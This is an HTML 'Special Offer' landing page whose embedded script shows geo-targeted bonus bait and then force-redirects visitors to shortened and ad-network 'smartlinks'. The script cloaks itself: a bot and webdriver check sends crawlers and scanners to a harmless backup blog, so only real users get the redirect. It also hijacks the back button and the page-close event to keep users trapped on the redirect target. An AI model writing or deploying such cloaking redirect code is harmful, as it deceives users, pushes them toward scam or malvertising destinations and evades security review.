<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Special Offer</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body{margin:0;font-family:Arial,sans-serif;background:#fafafa;color:#111;line-height:1.6}
#content{display:none;max-width:700px;margin:auto;padding:20px;text-align:center}
h1{font-size:22px;color:#111}
p{margin-bottom:15px}
footer{margin-top:30px;font-size:13px;color:#888}
#loading{display:flex;justify-content:center;align-items:center;height:100vh;}
</style>
</head>
<body>

<div id="loading"><h1>Please wait...</h1></div>

<div id="content">
  <h1 id="headline">Loading...</h1>
  <p id="desc">Preparing content...</p>
  <footer>&copy; 2025</footer>
</div>

<script>
(function(){
  const smartlinks = [
    "https://t.co/Fhy6lcYTmc",
    "https://t.co/oPtZz8Eaw2",
    "https://t.co/HQSRn68Hs8",
    "https://politicsgrowinghollow.com/cb3yh0vp?key=ff17dd66f144c9303ad63a6cef1e01ed"
  ];
  const backup = "https://scriptdev404.blogspot.com"; 

  const geoContent = {
    CA:{headline:["Exclusive Deal for Canada ðŸ‡¨ðŸ‡¦","Offre exclusive pour le Canada ðŸ‡¨ðŸ‡¦"],desc:["Unlock rewards available only in Canada.","DÃ©bloquez des rÃ©compenses disponibles uniquement au Canada."]},
    US:{headline:["Special Offer for USA ðŸ‡ºðŸ‡¸","Bonus Deal for US Visitors"],desc:["Claim your bonus now!","Only for USA visitors â€“ limited time."]},
    GLOBAL:{headline:["Worldwide Offer ðŸŒ","Special Bonus For You"],desc:["Available internationally â€“ claim now.","Get your deal anywhere, anytime."]}
  };

  const pickRandom = arr=>arr[Math.floor(Math.random()*arr.length)];
  function isBot(){
    const ua=navigator.userAgent.toLowerCase();
    const bots=["bot","crawl","spider","slurp","facebook","twitter","pinterest","crawler","google","bing","yahoo","yandex","baidu"];
    return bots.some(b=>ua.includes(b))||navigator.webdriver;
  }

  async function start(){
    const loading=document.getElementById("loading");
    const content=document.getElementById("content");
    const headline=document.getElementById("headline");
    const desc=document.getElementById("desc");

    // === BOT: hanya lihat konten aman, redirect ke backup ===
    if(isBot()){
      loading.style.display="none";
      content.style.display="block";
      headline.innerText = pickRandom(geoContent.GLOBAL.headline);
      desc.innerText = pickRandom(geoContent.GLOBAL.desc);
      setTimeout(()=>{ location.replace(backup); },1500);
      return;
    }

    // === USER: tampilkan lalu redirect ===
    let geo="GLOBAL";
    try{
      const r=await fetch("https://ipapi.co/json/").then(r=>r.json());
      if(r.country_code) geo=r.country_code.toUpperCase();
    }catch(e){ geo="GLOBAL"; }

    const c = geoContent[geo] || geoContent.GLOBAL;
    loading.style.display="none";
    content.style.display="block";
    headline.innerText = pickRandom(c.headline);
    desc.innerText = pickRandom(c.desc);

    const target = pickRandom(smartlinks);
    const delay = Math.floor(Math.random()*1000)+800;
    setTimeout(()=>{ location.replace(target); }, delay);

    // === Force redirect kalau user back/close ===
    setTimeout(()=>{
      history.pushState(null,null,location.href);
      onpopstate=()=>location.replace(target);
      onbeforeunload=()=>location.replace(target);
    },2000);
  }

  start();
})();
</script>
</body>
</html>
